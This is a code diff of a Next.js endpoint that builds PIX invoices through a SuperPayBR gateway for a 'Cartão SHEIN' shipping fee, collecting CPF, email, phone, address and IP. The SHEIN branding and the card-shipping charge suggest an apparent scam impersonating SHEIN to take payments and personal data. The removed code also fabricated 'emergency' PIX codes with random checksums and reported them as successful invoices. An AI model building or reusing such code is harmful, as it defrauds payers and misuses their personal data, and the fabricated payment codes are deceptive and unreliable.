@@ -2,7 +2,7 @@ import { type NextRequest, NextResponse } from "next/server"
 
 export async function POST(request: NextRequest) {
   try {
-    console.log("🔄 Criando fatura SuperPayBR...")
+    console.log("=== CRIANDO FATURA SUPERPAYBR ===")
 
     const body = await request.json()
     const { amount, shipping, method } = body
@@ -21,7 +21,7 @@ export async function POST(request: NextRequest) {
       email: userEmail,
     })
 
-    // ✅ PRIMEIRO, FAZER AUTENTICAÇÃO
+    // Primeiro, fazer autenticação
     const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
       method: "POST",
     })
@@ -31,21 +31,18 @@ export async function POST(request: NextRequest) {
       throw new Error(`Falha na autenticação SuperPayBR: ${authResult.error}`)
     }
 
-    const accessToken = authResult.token
+    const accessToken = authResult.data.access_token
 
     // Gerar external_id único
     const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
-    // ✅ PREPARAR DADOS DA FATURA SUPERPAYBR
+    // Preparar dados da fatura SuperPayBR conforme documentação
     const invoiceData = {
-      external_id: externalId,
-      amount: Math.round(amount * 100), // SuperPayBR usa centavos
-      description: `Frete ${method} - Cartão SHEIN`,
-      customer: {
+      client: {
         name: cpfData.nome || "Cliente SHEIN",
-        email: userEmail || "cliente@shein.com",
-        phone: userWhatsApp || "11999999999",
         document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
+        email: userEmail || "cliente@shein.com",
+        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
         address: {
           street: deliveryAddress.street || "Rua Principal",
           number: deliveryAddress.number || "123",
@@ -55,17 +52,37 @@ export async function POST(request: NextRequest) {
           zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01001000",
           country: "BR",
         },
+        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
       },
-      payment_methods: ["PIX"],
-      expires_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString(), // 2 horas
-      webhook_url: process.env.SUPERPAYBR_WEBHOOK_URL,
+      payment: {
+        id: externalId,
+        type: "3", // PIX
+        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0], // 2 horas
+        referer: `SHEIN_FRETE_${method}`,
+        installment: 1,
+        order_url: `${request.nextUrl.origin}/checkout`,
+        store_url: request.nextUrl.origin,
+        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
+        discount: 0,
+        products: [
+          {
+            id: "1",
+            title: `Frete ${method} - Cartão SHEIN`,
+            qnt: 1,
+            amount: Number.parseFloat(amount),
+          },
+        ],
+      },
+      shipping: {
+        amount: 0,
+      },
     }
 
     console.log("🚀 Enviando para SuperPayBR API...")
     console.log("📤 Payload:", JSON.stringify(invoiceData, null, 2))
 
-    // ✅ CRIAR FATURA NA SUPERPAYBR
-    const createResponse = await fetch(`${process.env.SUPERPAYBR_API_URL}/invoices`, {
+    // Criar fatura na SuperPayBR
+    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -81,69 +98,40 @@ export async function POST(request: NextRequest) {
       ok: createResponse.ok,
     })
 
-    const responseText = await createResponse.text()
-    console.log("📄 Resposta completa:", responseText.substring(0, 1000))
-
     if (createResponse.ok) {
-      let invoiceResult
-      try {
-        invoiceResult = JSON.parse(responseText)
-      } catch (parseError) {
-        console.error("❌ Erro ao parsear JSON:", parseError)
-        throw new Error(`Resposta inválida da API: ${responseText}`)
-      }
-
+      const invoiceResult = await createResponse.json()
       console.log("✅ Fatura SuperPayBR criada com sucesso!")
       console.log("📋 Dados da fatura:", JSON.stringify(invoiceResult, null, 2))
 
-      // ✅ EXTRAIR PIX COM TRATAMENTO SEGURO
+      // Extrair dados do PIX com múltiplas tentativas
       let pixPayload = ""
       let qrCodeImage = ""
 
-      try {
-        // Múltiplas tentativas de extração do PIX
-        if (invoiceResult.data?.payment?.details?.pix_code) {
-          pixPayload = invoiceResult.data.payment.details.pix_code
-          qrCodeImage = invoiceResult.data.payment.details.qrcode || ""
-        } else if (invoiceResult.data?.pix?.payload) {
-          pixPayload = invoiceResult.data.pix.payload
-          qrCodeImage = invoiceResult.data.pix.image || ""
-        } else if (invoiceResult.pix?.payload) {
-          pixPayload = invoiceResult.pix.payload
-          qrCodeImage = invoiceResult.pix.image || ""
-        } else if (invoiceResult.data?.details?.pix_code) {
-          pixPayload = invoiceResult.data.details.pix_code
-          qrCodeImage = invoiceResult.data.details.qrcode || ""
-        }
-
-        console.log("🔍 PIX extraído:", {
-          pixPayload: pixPayload ? "✅ PRESENTE" : "❌ AUSENTE",
-          qrCodeImage: qrCodeImage ? "✅ PRESENTE" : "❌ AUSENTE",
-        })
-      } catch (extractError) {
-        console.error("❌ Erro ao extrair PIX:", extractError)
+      // Tentar diferentes caminhos para encontrar o PIX payload
+      if (invoiceResult.fatura?.pix?.payload) {
+        pixPayload = invoiceResult.fatura.pix.payload
+        qrCodeImage = invoiceResult.fatura.pix.image || ""
+      } else if (invoiceResult.pix?.payload) {
+        pixPayload = invoiceResult.pix.payload
+        qrCodeImage = invoiceResult.pix.image || ""
+      } else if (invoiceResult.payload) {
+        pixPayload = invoiceResult.payload
       }
 
-      // ✅ GERAR PIX DE EMERGÊNCIA SE NECESSÁRIO
-      if (!pixPayload) {
-        console.log("🚨 Gerando PIX de emergência SuperPayBR...")
+      console.log("🔍 PIX Payload encontrado:", pixPayload ? "✅ SIM" : "❌ NÃO")
+      console.log("🖼️ QR Code Image:", qrCodeImage ? "✅ SIM" : "❌ NÃO")
 
-        // Gerar PIX payload de emergência realista
-        const emergencyPix = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
-
-        pixPayload = emergencyPix
-        console.log("✅ PIX de emergência gerado")
-      }
-
-      // ✅ GERAR QR CODE USANDO QUICKCHART SEMPRE
-      const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
+      // Gerar QR Code usando QuickChart SEMPRE
+      const qrCodeUrl = pixPayload
+        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
+        : "/placeholder.svg?height=250&width=250"
 
       console.log("🎯 QR Code URL final:", qrCodeUrl)
 
       // Mapear resposta para formato esperado
       const mappedInvoice = {
-        id: invoiceResult.data?.id || invoiceResult.id || externalId,
-        invoice_id: invoiceResult.data?.invoice_id || invoiceResult.data?.id || externalId,
+        id: invoiceResult.fatura?.id || invoiceResult.id || externalId,
+        invoice_id: invoiceResult.fatura?.invoice_id || invoiceResult.invoice_id || externalId,
         external_id: externalId,
         pix: {
           payload: pixPayload,
@@ -151,21 +139,21 @@ export async function POST(request: NextRequest) {
           qr_code: qrCodeUrl, // Usar sempre QuickChart
         },
         status: {
-          code: invoiceResult.data?.status?.code || 1,
-          title: invoiceResult.data?.status?.title || "Aguardando Pagamento",
+          code: invoiceResult.fatura?.status?.code || invoiceResult.status?.code || 1,
+          title: invoiceResult.fatura?.status?.title || invoiceResult.status?.title || "Aguardando Pagamento",
           text: "pending",
         },
         valores: {
-          bruto: Math.round(amount * 100), // SuperPayBR usa centavos
-          liquido: Math.round(amount * 100),
+          bruto: Math.round(Number.parseFloat(amount) * 100), // SuperPayBR usa centavos
+          liquido: Math.round(Number.parseFloat(amount) * 100),
         },
         vencimento: {
           dia: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
         },
-        type: "real" as const,
+        type: "real",
       }
 
-      console.log("🎯 Fatura mapeada final criada com sucesso!")
+      console.log("🎯 Fatura mapeada final:", JSON.stringify(mappedInvoice, null, 2))
 
       return NextResponse.json({
         success: true,
@@ -178,60 +166,27 @@ export async function POST(request: NextRequest) {
         },
       })
     } else {
-      console.error("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, responseText)
-      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${responseText}`)
+      const errorText = await createResponse.text()
+      console.log("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, errorText)
+
+      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorText}`)
     }
   } catch (error) {
-    console.error("❌ Erro ao criar fatura SuperPayBR:", error)
+    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
 
-    // ✅ RETORNAR PIX DE EMERGÊNCIA EM CASO DE ERRO
-    const amount = 34.9 // valor padrão
-    const externalId = `EMG_${Date.now()}`
-
-    const emergencyPix = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
-
-    const emergencyQrCode = `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=250&format=png&margin=1`
-
-    const emergencyData = {
-      id: externalId,
-      invoice_id: externalId,
-      external_id: externalId,
-      pix: {
-        payload: emergencyPix,
-        image: emergencyQrCode,
-        qr_code: emergencyQrCode,
+    // Retornar erro para que o frontend possa criar PIX de emergência
+    return NextResponse.json(
+      {
+        success: false,
+        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura SuperPayBR",
+        should_create_emergency: true,
       },
-      status: {
-        code: 1,
-        title: "Aguardando Pagamento",
-        text: "pending",
-      },
-      valores: {
-        bruto: Math.round(amount * 100),
-        liquido: Math.round(amount * 100),
-      },
-      vencimento: {
-        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-      },
-      type: "emergency" as const,
-    }
-
-    console.log("🚨 PIX de emergência criado devido ao erro")
-
-    return NextResponse.json({
-      success: true,
-      data: emergencyData,
-      message: "PIX de emergência criado",
-      error: error instanceof Error ? error.message : "Erro desconhecido",
-      debug: {
-        emergency: true,
-        original_error: error instanceof Error ? error.message : "Erro desconhecido",
-      },
-    })
+      { status: 500 },
+    )
   }
 }
 
-export async function GET() {
+export async function GET(request: NextRequest) {
   return NextResponse.json({
     success: true,
     message: "SuperPayBR Create Invoice endpoint ativo",
